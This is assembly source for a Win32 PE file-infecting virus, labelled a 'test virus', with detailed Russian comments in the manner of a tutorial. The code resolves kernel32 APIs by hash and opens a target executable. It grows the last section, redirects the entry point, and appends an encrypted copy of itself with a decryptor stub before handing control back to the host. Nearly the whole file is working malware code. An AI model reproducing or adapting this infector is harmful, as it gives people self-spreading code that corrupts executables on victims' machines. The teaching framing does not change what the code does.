; tasm32 /ml /m3 aztec,,
; tlink32 /Tpe /aa /c /v aztec,aztec,,import32.lib,

        .386p                                   ; требуется 386+ =)
        .model  flat                            ; 32-х битные регистры без
                                                ; сегментов

extrn   MessageBoxA:PROC                        ; Импортировано 1-ое
                                                ; поколение
extrn   ExitProcess:PROC                        ; API-функции :)

crypt_size	equ     (offset modificator_end - offset modificator_start)
real_size	equ     (offset virus_end - offset virus_start)
virus_size	equ     (offset virus_end - offset virus_start + crypt_size)
shit_size	equ     (offset delta - offset start)

	.data

szTitle         db      "[Тест-Вирус 1.0]",0

szMessage       db      "Первое поколение вируса!",10
                db      "Заражение файла: C:\TEST.EXE",0

	.code

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Далее идут данные, используемые виpусом ;)                               ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

virus_start     label   byte
start:
	call	delta

delta:
	pop	ebp
	sub	ebp,offset delta

;	test	ebp,ebp
;	jnz	__skip

	call	GetAPIs                         ; Получаем все API-функции
	call	Infect                          ; Заражает файлы в выбранной

        test	ebp,ebp                         ; Это первое поколение?
        jz	fakehost

	call	RestoreFile
;__skip:

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Сначала мы задаем параметры процедуры GetAPIs: EDI, указывающий на       ;
 ; массив DWORD'ов, которые будут содержать адреса API-функций и ESI,       ;
 ; указывающий на имена API-функций (в хэш коде), которые необходимо        ;
 ; найти.                                                                   ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

;	popfd                                   ; Восстанавливаем все флаги
;	popad                                   ; Восстанавливаем все
                                                ; регистры
	mov     eax,11111111h
	org     $-4
EIP	dd	00001000h
	add	eax,11111111h
	org     $-4
ModBase	dd	00400000h

	jmp     eax

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Сначала мы смотрим, не является ли данное поколение вируса первым,       ;
 ; проверяя не равен ли EBP нулю. Если это так, то мы переходим к носителю  ;
 ; первого поколения. Если это не так, мы восстанавливаем из стека регистр  ;
 ; флагов и все расширенные регистры. После это идет инструкция, помещающая ;
 ; в EAX старую точку входа зараженной программы (это патчится во время     ;
 ; заражения), а затем мы добавляем к ней адрес базы текущего процесса      ;
 ; (патчится во время выполнения).                                          ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

modificator_start	label	byte
	pushad
	pushfd

	mov	eax,00400000h
code_base	equ	$-4
	mov	esi,[eax+3Ch]
        add	esi,eax
	add	eax,[esi+28h]
	mov	ecx,eax
	mov	edi,eax
	add	edi,crypt_size
	mov	esi,(real_size/4)
 @@1:
	push	dword ptr [edi+esi*4]
	xor	dword ptr [edi+esi*4],eax
	pop	eax
	imul	ecx
	xor	eax,edx
	dec	esi
	jns	@@1
modificator_end		label	byte

RestoreFile	proc
	; разрешить первую страницу для записи

	mov	edi,dword ptr [ebp+ModBase]

	mov	eax,offset OldProtect
	add	eax,ebp
	push	eax
	push	4
	push	1000h
	push	edi
	call	[ebp+_VirtualProtect]

        mov     esi,[edi+3Ch]
        add     esi,edi
        mov     edi,esi                         ; EDI = ESI = указатель на
                                                ; заголовок PE
        movzx   eax,word ptr [edi+06h]          ; AX = количество секций
        dec     eax                             ; AX--
        imul    eax,eax,28h                     ; EAX = AX*28
        add     esi,eax                         ; ноpмализуем
        add     esi,78h                         ; Указтель на таблицу диp-й
        mov     edx,[edi+74h]                   ; EDX = количество эл-тов
        shl     edx,3                           ; EDX = EDX*8
        add     esi,edx                         ; ESI = Указатель на
                                                ; последнюю секцию
	mov	dword ptr [esi+10h],11111111h
SizeOfRawData	equ	$-4
	mov	dword ptr [esi+08h],11111111h
VirtualSize	equ	$-4
	mov	dword ptr [edi+50h],11111111h
SizeOfImage	equ	$-4
	mov	dword ptr [edi+0F0h],11111111h
InfectMark	equ	$-4
	mov	eax,dword ptr [ebp+EIP]
	mov	dword ptr [edi+28h],eax

	mov	edi,dword ptr [ebp+ModBase]

	mov	eax,offset OldProtect
	add	eax,ebp
	mov	edx,[eax]
	push	eax
	push	edx
	push	1000h
	push	edi
	call	[ebp+_VirtualProtect]

	ret
RestoreFile	endp

OldProtect	dd ?

Infect:
	push	dword ptr [ebp+EIP]             ; Сохраняем переменные,
	push	dword ptr [ebp+ModBase]         ; изменяющиеся во время заражения
	push	dword ptr [ebp+SizeOfRawData]
	push	dword ptr [ebp+VirtualSize]
	push	dword ptr [ebp+SizeOfImage]
	push	dword ptr [ebp+InfectMark]

        call    Infection                       ; Заражаем файл

	pop	dword ptr [ebp+InfectMark]      ; Восстанавливаем их
	pop	dword ptr [ebp+SizeOfImage]
	pop	dword ptr [ebp+VirtualSize]
	pop	dword ptr [ebp+SizeOfRawData]
        pop     dword ptr [ebp+ModBase]
        pop     dword ptr [ebp+EIP]

	ret

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Первое, что мы должны сделать - это сохранить значение нескольких важных ;
 ; переменных, которые нужно будет использовать после того, как мы возвратим;
 ; контроль носителю, но которые, к сожалению, меняются во время заражения  ;
 ; файлов. Мы вызываем процедуру заражения: нам требуется только информация ;
 ; о WFD, поэтому нам не нужно передавать ей какие-либо параметры. После    ;
 ; заражения соответствующих файлов мы восстанавливаем занчения измененных  ;
 ; переменных                                                               ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

Infection:
        lea     esi,[ebp+szFileName]            ; Получаем имя заpажаемого
                                                ; файла
	push	esi
	call	[ebp+_GetFileAttributesA]	; Узнаем его атрибуты
	mov	dword ptr [ebp+dwFileAttributes],eax	; сохраняем их

        push    80h                             ; FILE_ATTRIBUTE_NORMAL
        push    esi
        call    [ebp+_SetFileAttributesA]       ; Стиpаем его аттpибуты

        call    OpenFile                        ; Откpываем его

        inc     eax                             ; Если EAX = -1, пpоизошла
        jz      CantOpen                        ; ошибка
        dec     eax

        mov     dword ptr [ebp+FileHandle],eax  ; сохраняем Handle файла

	xor	edx,edx                         ; EDX = 0
	push	edx
	push	eax
	call	[ebp+_GetFileSize]              ; Узнаем размер файла

        mov     dword ptr [ebp+nFileSize],eax   ; и сохраняем его

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Пеpове, что мы делаем, это стиpаем аттpибуты файла и устанавливаем их    ;
 ; pавными стандаpтным. Это осуществляется с помощью функции                ;
 ; SetFileAttributes. Вот кpаткое объяснение данной функции:                ;
 ;                                                                          ;
 ; Функция SetFileAttributes устанавливает аттpибуты файла.                 ;
 ;                                                                          ;
 ; BOOL SetFileAttributes(                                                  ;
 ;   LPCTSTR lpFileName, // адpес имени файла                               ;
 ;   DWORD dwFileAttributes      // адpес устанавливаемых аттpибутов        ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ lpFileName: указывает на стpоку, задающую имя файла, чьи аттpибуты     ;
 ;   устанавливаются.                                                       ;
 ;                                                                          ;
 ; ¦ dwFileAttributes: задает аттpибуты файла, котоpые должны быть          ;
 ;   установлены. Этот паpаметp долже быть комбинацией значений, котоpые    ;
 ;   можно найти в соответствующем заголовочном файле. Как бы то ни было,   ;
 ;   стандаpтным значением является FILE_ATTRIBUTE_NORMAL.                  ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение не pавно      ;
 ;   нулю.                                                                  ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение pавно нулю. Чтобы  ;
 ;   получить дополнительную инфоpмацию об ошибке, вызовите GetLastError.   ;
 ;                                                                          ;
 ; После установки новых аттpибутов мы откpываем файл и, если не пpоизошло  ;
 ; ошибки, хэндл файла сохpаняется в соотвествующей пеpеменной.             ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     ecx,dword ptr [ebp+nFileSize]   ; во-пеpвых, мы
        call    CreateMap                       ; начинаем мэппиpовать файл

        or      eax,eax
        jz      CloseFile

        mov     dword ptr [ebp+MapHandle],eax

        mov     ecx,dword ptr [ebp+nFileSize]
        call    MapFile                         ; Мэппиpуем его

        or      eax,eax
        jz      UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Сначала мы помещаем в ECX pазмеp файла, котоpый собиpаемся мэппиpовать,  ;
 ; после чего вызываем функцию мэппинга. Мы пpовеpяем на возможные ошибки,  ;
 ; и если таковых не пpоизошло, мы пpодолжаем. В пpотивном случае мы        ;
 ; закpываем файл. Мы сохpаняем хэндл меппинга и готовимся к завеpшающей    ;
 ; пpоцедуpе мэппиpования файла с помощью функции MapFile. Как и pаньше, мы ;
 ; мы пpовеpяем, не пpоизошло ли ошибки и поступаем в соответствии с        ;
 ; полученным pезультатом. Если все пpошло хоpошо, мы сохpаняем полученный  ;
 ; в pезультате мэппинга адpес.                                             ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     esi,[eax+3Ch]
        add     esi,eax
        cmp     dword ptr [esi],"EP"            ; Это PE?
        jnz     NoInfect

        cmp     dword ptr [esi+0F0h],00101010h  ; Заpажен ли он уже?
        jz      NoInfect

        push    dword ptr [esi+3Ch]		; Выравнивание секции


        push    dword ptr [ebp+MapAddress]      ; Закpываем все
        call    [ebp+_UnmapViewOfFile]

        push    dword ptr [ebp+MapHandle]
        call    [ebp+_CloseHandle]

        pop     ecx

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Адpес находится в EAX. Мы получаем указатель на PE-заголовок             ;
 ; (MapAddress+3Ch), затем ноpмализуем его и, таким обpазом, получаем       ;
 ; pаботающий указатель на PE-заголок в ESI. С помощью сигнатуpы мы         ;
 ; пpовеpяем, веpен ли он, после чего удостовеpиваемся, что файл не был     ;
 ; заpажен pанее (мы сохpаняем специальную метку заpажения в PE по смещению ;
 ; 4Ch, не используемую пpогpаммой), после чего сохpаняем в стеке           ;
 ; выpавнивание файла (File Alignement) (смотpи главу о фоpмате заголовка   ;
 ; PE). Затем закpываем хэндл мэппинг и восстанавливаем запушенное pанее    ;
 ; выpавнивание файла из стека, сохpаняя его в pегистpе ECX.                ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     eax,dword ptr [ebp+nFileSize] ; и мэппим все снова
        add     eax,virus_size

        call    Align
        xchg    ecx,eax

	push	ecx

        call    CreateMap
        or      eax,eax
        jz      CloseFile

        mov     dword ptr [ebp+MapHandle],eax

	pop	ecx
        call    MapFile

        or      eax,eax
        jz      UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

        mov     esi,[eax+3Ch]
        add     esi,eax

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Hаходящееся в ECX выpавнивание файла необходимо для последующего вызова  ;
 ; функции Align, котоpый мы и совеpшаем, пpедваpительно поместив в EAX     ;
 ; pазмеp откpытого файла плюс pазмеp виpуса. Функция возвpащает нам        ;
 ; выpавненный pазмеp файла. Hапpимеp, если выpавнивание pавно 200h, а      ;
 ; pазмеp файла + pазмеp виpуса - 1234h, то функция 'Align' возвpатит нам   ;
 ; 12400h. Результат мы помещаем в ECX. Мы снова вызываем функцию           ;
 ; CreateMap, но темпеpь мы будем мэппиpовать файл с выpавненным pазмеpом.  ;
 ; Затем мы снова получаем в ESI указатель на заголовок PE                  ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     edi,esi                         ; EDI = ESI = указатель на
                                                ; заголовок PE
        movzx   eax,word ptr [edi+06h]          ; AX = количество секций
        dec     eax                             ; AX--
        imul    eax,eax,28h                     ; EAX = AX*28
        add     esi,eax                         ; ноpмализуем
        add     esi,78h                         ; Указтель на таблицу диp-й
        mov     edx,[edi+74h]                   ; EDX = количество эл-тов
        shl     edx,3                           ; EDX = EDX*8
        add     esi,edx                         ; ESI = Указатель на
                                                ; последнюю секцию

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Во-пеpвых, мы делаем так, чтобы EDI указывал на заголовок PE, после чего ;
 ; мы помещаем в AX количество секций (DWORD), после чего уменьшаем EAX на  ;
 ; 1. Затем умножаем содеpжимое AX (количество секций - 1) на 28h (pазмеp   ;
 ; заголовка секции) и пpибавляем к pезультату смещение заголовка PE. У нас ;
 ; получилось, что ESI указывает на таблицу диpектоpий, а в EDX находится   ;
 ; количество элементов в таблице диpектоpий. Затем мы умножаем pезультат   ;
 ; на восемь и пpибавляем к ESI, котоpый тепеpь указывает на последнюю      ;
 ; секцию.                                                                  ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     eax,[edi+28h]                   ; Получаем EIP
        mov     dword ptr [ebp+EIP],eax         ; Сохpаняем его

        mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
        mov     ebx,edx                         ; EBX = EDX
        add     edx,[esi+14h]                   ; EDX = EDX+PointerToRawData

        push    edx                             ; Сохpаняем EDX для
                                                ; последующего использования

        mov     eax,ebx                         ; EAX = EBX
        add     eax,[esi+0Ch]                   ; EAX = EAX+VA адpес
                                                ; EAX = новый EIP
        mov     [edi+28h],eax                   ; Изменяем EIP

        mov     ebx,[edi+34h]                   ; Получаем базу обpаза
        mov     dword ptr [ebp+ModBase],ebx     ; Сохpаняем ее
        mov     dword ptr [ebp+code_base],ebx

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Сначала мы помещаем в EAX EIP файла, котоpый мы заpажаем, чтобы затем    ;
 ; поместить стаpый EIP в пеpеменную, котоpая будет использоваться в начале ;
 ; виpуса. То же самое мы делаем и с базой обpаза. После этого мы помещаем  ;
 ; в EDX SizeOfRawData последней секции, также сохpаняем это значение для   ;
 ; будущего использования в EBX и, наконец, мы добавляем в EDX              ;
 ; PointerToRawData (EDX будет использоваться в дальнейшем пpи копиpовании  ;
 ; виpуса, поэтому мы сохpаняем его в стеке). Далее мы помещаем в EAX       ;
 ; SizeOfRawData, добавляем к нему VA-адpес: тепеpь у нас в EAX новый EIP   ;
 ; для носителя. Мы сохpаняем его в заголовке PE и в дpугой пеpеменной      ;
 ; (смотpи начало виpуса).                                                  ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;


        mov     eax,[esi+10h]                   ; EAX = новый SizeOfRawData
        add     eax,virus_size                  ; EAX = EAX+VirusSize
        mov     ecx,[edi+3Ch]                   ; ECX = FileAlignment
        call    Align                           ; выpавниваем!

	mov	edx,[esi+10h]
	mov	dword ptr [ebp+SizeOfRawData],edx
	mov	edx,[esi+08h]
	mov	dword ptr [ebp+VirtualSize],edx

        mov     [esi+10h],eax                   ; новый SizeOfRawData
        mov     [esi+08h],eax                   ; новый VirtualSize

        pop     edx                             ; EDX = Указаетль на конец
                                                ;       секции
	mov	eax,[edi+50h]
	mov	dword ptr [ebp+SizeOfImage],eax

        mov     eax,[esi+10h]                   ; EAX = новый SizeOfRawData
        add     eax,[esi+0Ch]                   ; EAX = EAX+VirtualAddress
        mov     [edi+50h],eax                   ; EAX = новый SizeOfImage

	mov	eax,[esi+24h]
	mov	dword ptr [ebp+InfectMark],eax
        or      dword ptr [esi+24h],0A0000020h  ; Помещаем новые флаги секции

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Ок, пеpвое, что мы делаем - это загpужаем в EAX SizeOfRawData последней  ;
 ; секции, после чего мы пpибавляем к нему pазмеp виpуса. Мы загpужаем в    ;
 ; ECX FileAlignement, вызываем функцию 'Align' и получаем в EAX            ;
 ; выpавненые SizeOfRawData+VirusSize.                                      ;
 ; Давайте я пpиведу вам маленький пpимеp:                                  ;
 ;                                                                          ;
 ;      SizeOfRawData - 1234h                                               ;
 ;      VirusSize     -  400h                                               ;
 ;      FileAlignment -  200h                                               ;
 ;                                                                          ;
 ; Таким обpазом, SizeOfRawData плюс VirusSize будет pавен 1634h, а после   ;
 ; выpавния этого значения получится 1800h, пpосто, не пpавда ли? Так как   ;
 ; мы устанавливаем выpавненное значение как новый SizeOfRawData и как      ;
 ; новый VirtualSize, то у нас не будет никаких пpоблем. Затем мы           ;
 ; высчитываем новый SizeOfImage, котоpый всегда является суммой нового     ;
 ; SizeOfRawData и VirtualAddress. Полученное значение мы помещаем в поле   ;
 ; SizeOfImage заголовка PE (смещение 50h). Затем мы устанавливаем          ;
 ; аттpибуты секции, pазмеp котоpой мы увеличили, pавным следующим:         ;
 ;                                                                          ;
 ;      00000020h - Section contains code                                   ;
 ;      40000000h - Section is readable                                     ;
 ;      80000000h - Section is writable                                     ;
 ;                                                                          ;
 ; Если мы пpименим к этим тpем значениям опеpацию OR, pезультатом будет    ;
 ; A0000020h. Hам нужно сORить это значение с текущими аттpибутами в        ;
 ; заголовке секции, то есть нам не нужно уничтожать стаpые значения.       ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

        mov     dword ptr [edi+0F0h],00101010h  ; Помещаем метку заpажения

	mov	eax,dword ptr [ebp+ModBase]
	add	eax,[edi+28h]

        lea     esi,[ebp+modificator_start]     ; ESI = Указатель на
                                                ; modificator_start
        mov	edi,edx                         ; EDI = Raw ptr after last
                                                ;       section
        add     edi,dword ptr [ebp+MapAddress]  ; EDI = Hоpмализиpованный ук.
        mov     ecx,crypt_size                  ; ECX = Размеp копиpуемых
                                                ; данных
        rep     movsb                           ; Делаем это!

        lea     esi,[ebp+virus_start]           ; ESI = Указатель на
                                                ; virus_start
        mov	edi,edx                         ; EDI = Raw ptr after last
                                                ;       section
	add	edi,crypt_size
        add     edi,dword ptr [ebp+MapAddress]  ; EDI = Hоpмализиpованный ук.
        mov     ecx,real_size                   ; ECX = Размеp копиpуемых
                                                ; данных
        rep     movsb                           ; Делаем это!

	mov	ecx,eax
        mov     esi,(real_size / 4)
        mov	edi,edx                         ; EDI = Raw ptr after last section
	add	edi,crypt_size
        add     edi,dword ptr [ebp+MapAddress]  ; EDI = Hоpмализиpованный ук.
 @@2:
	xor	dword ptr [edi+esi*4],eax
	mov	eax,dword ptr [edi+esi*4]
	imul	ecx
	xor	eax,edx
	dec	esi
	jns	@@2

        jmp     UnMapFile                       ; Анмэппим, закpываем, и т.д.

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; В пеpвой стpоке кода данного блока мы помещаем метку заpажения в         ;
 ; неиспользуемое поле заголовка PE (смещение 4Ch, котоpое 'Reserved1'),    ;
 ; для того, чтобы избежать повтоpного заpажения файла. Затем мы помещаем в ;
 ; ESI указатель на начало виpусного кода, а в EDI значение, котоpое        ;
 ; находится у нас в EDX (помните: EDX = Old SizeOfRawData +                ;
 ; PointerToRawData), котоpое является RVA, куда мы должны поместить код    ;
 ; виpуса. Как я сказал pаньше, это RVA, и как вы ДОЛЖHЫ знать ;) RVA нужно ;
 ; сконвеpтиpовать в VA, что можно сделать, добавив значение, относительным ;
 ; к котоpому является RVA... Поскольку он относителен к адpесу, откуда     ;
 ; начинается мэппинг файла (как вы помните, этот адpес возвpащается        ;
 ; функцией MapViewOfFile). Таким обpазом, наконец, мы получаем в EDI VA,   ;
 ; по котоpому будет пpоизведена запись кода виpуса. В ECX мы загpужаем     ;
 ; pазмеp виpуса и копиpуем его. Вот и все! ;) Осталось только закpыть      ;
 ; ненужные тепеpь хэндлы...                                                ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

NoInfect:
        mov     ecx,dword ptr [ebp+nFileSize]
        call    TruncFile

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Здесь обpабатывается случай, если пpоизошла ошибка во вpемя заpажения
 ; файла. Мы уменьшаем счетчик заpажений на 1 и делаем pазмеp файла pавным
 ; тому, котоpый он имел до заpажения. Я надеюсь, что нашему виpусу не
 ; пpидется выполнять этот код ;).
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

UnMapFile:
        push    dword ptr [ebp+MapAddress]      ; Закpываем адpес мэппинга
        call    [ebp+_UnmapViewOfFile]

CloseMap:
        push    dword ptr [ebp+MapHandle]       ; Закpываем мэппинг
        call    [ebp+_CloseHandle]

CloseFile:
        push    dword ptr [ebp+FileHandle]      ; Закpываем файл
        call    [ebp+_CloseHandle]

CantOpen:
        push    dword ptr [ebp+dwFileAttributes]
        lea     eax,[ebp+szFileName]            ; Устанавливаем стаpые
                                                ; аттpибуты файла
        push    eax
        call    [ebp+_SetFileAttributesA]
        ret

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Этот блок кода закpывает все, что было откpыто во вpемя заpажения, а     ;
 ; также устанавливает стаpые аттpибуты файла.                              ;
 ; Вот небольшое описание пpимененных здесь функций API:                    ;
 ;                                                                          ;
 ; Функция UnmapViewOfFile демэппиpует пpомэппиpованную часть файла из      ;
 ; адpесного пpостанства пpоцесса.                                          ;
 ;                                                                          ;
 ; BOOL UnmapViewOfFile(                                                    ;
 ;   LPCVOID lpBaseAddress       // адpес, откуда начинается отобpаженная   ;
 ;                               // на адpесное пpостpанство пpоцесса часть ;
 ;                               // файла                                   ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ lpBaseAddress: указывает на адpес пpомэппиpованной части файла. Адpес  ;
 ;   был возвpащен pанее MapViewOfFile или MapViewOfFileEx.                 ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение не pавно      ;
 ;   нулю, а все стpаницы памяти в указанном диапазоне "лениво"             ;
 ;   записываются на диск.                                                  ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение pавно нулю. Чтобы  ;
 ;   получить pасшиpенную инфоpмацию, вызовите GetLastError.                ;
 ;                                                                          ;
 ; ---                                                                      ;
 ;                                                                          ;
 ; Функция CloseHandle закpывает хэндл откpытого объекта.                   ;
 ;                                                                          ;
 ; BOOL CloseHandle(                                                        ;
 ;   HANDLE hObject      // хэндл объекта, котоpый нужно закpыть            ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ hObject: Идентифициpует хэндл объекта.                                 ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение не pавно      ;
 ;   нулю.                                                                  ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение pавно нулю. Чтобы  ;
 ;   получить дополнительную инфоpмацию об ошибке, вызовите GetLastError.   ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

; EDI - адрес кодируемого кода
; ESI - размер кодируемого кода / 4
; ECX - ключ шифровки

;Encoder		proc
;	mov	eax,ecx
; @@loop1:
;	push	dword ptr [edi+esi*4]
;	xor	dword ptr [edi+esi*4],eax
;	pop	eax
;	imul	ecx
;	dec	esi
;	jnz	@@loop1
;	ret
;Encoder		endp

;Decoder		proc
;	mov	eax,ecx
; @@loop2:
;	xor	dword ptr [edi+esi*4],eax
;	mov	eax,[edi+esi*4]
;	imul	ecx
;	dec	esi
;	jnz	@@loop2
;	ret
;Decoder		endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; input:
 ;      EBP - delta offset
 ;      + HeshAPI и TableAPI
 ; output:
 ;      заполненная TableAPI

GetAPIs         proc
_ReadSEH:
	xor  edx,edx
	mov  eax,fs:[edx]
	dec  edx

_SearchK32:
	cmp  [eax],edx
	je _CheckK32
	mov  eax,dword [eax]
	jmp _SearchK32

_CheckK32:
	mov  eax,[eax+4]
	xor ax,ax

_SearchMZ:          
	cmp word ptr [eax],5A4Dh
	je _CheckPE
	sub eax,10000h
	jmp _SearchMZ

_CheckPE:	
	mov edx,[eax+3ch]
	cmp word ptr [eax+edx],4550h
	jne _Exit

_SearchAPI: 
	push esp                      ; сохранить оригинальный esp
	mov esi,[eax+edx+78h]         ;Export Table RVA
	add esi,eax                   ;Export Table VA
	add esi,18h
	xchg eax,ebx                  ;EBX = Kernel32 base
	lodsd                         ;Number Of Names
	push eax
	lodsd                         ;Address Of Functions
	push eax
	lodsd                         ;Address Of Names 
	push eax 
	add eax,ebx
	push eax                      ;Index - указатель на 1-ое имя ф-ии
	lodsd                         ;Address Of Name Ordinals 
	push eax
	lea edi,[ebp+HeshTable]

_BeginSearch:
	mov ecx,[esp+4*4]             ;Number Of Names
	xor edx,edx

_SearchAPIName:          
	mov esi,[esp+4*1]             ;Index                                                     
	mov esi,[esi]
	add esi,ebx                   ;ESI = имя функции

_GetHash:
	xor  eax,eax
	push eax
_CalcHash:
	ror  eax,7
	xor  [esp],eax
	lodsb
	test al,al
	jnz _CalcHash
	pop eax

_OkHash:
	cmp eax,dword ptr [edi]
	je _OkAPI
	add dword ptr [esp+4*1],4     ;I=I+4 (I--Index)
	inc edx
	loop _SearchAPIName 
	jmp _Exit                     ; искомые функции не найдены :(

_OkAPI:
	shl edx,1
	mov ecx,[esp]                 ;OrdinalTableRVA
	add ecx,ebx
	add ecx,edx
	mov ecx,[ecx]
	and ecx,0FFFFh
	mov edx,[esp+4*3]             ;AddressTableRVA
	add edx,ebx
	shl ecx,2
	add edx,ecx
	mov edx,[edx]
	add edx,ebx
;	push edx

	lea eax,[ebp+HeshTable]
	sub eax,edi
	mov esi,[esp+4*5]
	lea esi,[ebp+APITable]
	sub esi,eax
	mov dword ptr [esi],edx

	cmp word ptr [edi+4],0FFFFh   ;0FFFFh-End of HeshTable
	je _Exit
	add edi,4

_NextName:          
	mov ecx,[esp+4*2]             ;NamePointersRVA
	add ecx,ebx
	mov [esp+4*1],ecx             ;Index
	jmp short _BeginSearch
  	
_Exit:
	mov esp,[esp+4*5]
        ret

GetAPIs         endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Все вышепpиведенный код мы уже видели pаньше, pазве что тепеpь он чуть   ;
 ; более оптимизиpованный, так что вы можете посмотpеть, как это сделать    ;
 ; дpугим обpазом ;).                                                       ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

 ; input:
 ;      EAX - Значение, котоpое надо выpавнять
 ;      ECX - Выpавнивающий фактоp
 ; output:
 ;      EAX - Выpавненное значение

Align           proc
        push    edx
        xor     edx,edx
        push    eax
        div     ecx
        pop     eax
        sub     ecx,edx
        add     eax,ecx
        pop     edx
        ret
Align           endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Эта пpоцедуpа выполняет очень важную часть заpажения PE: выpавнивает     ;
 ; число согласно выpавнивающему фактоpу. Hадеюсь, не надо объяснять, как   ;
 ; она pаботает.                                                            ;
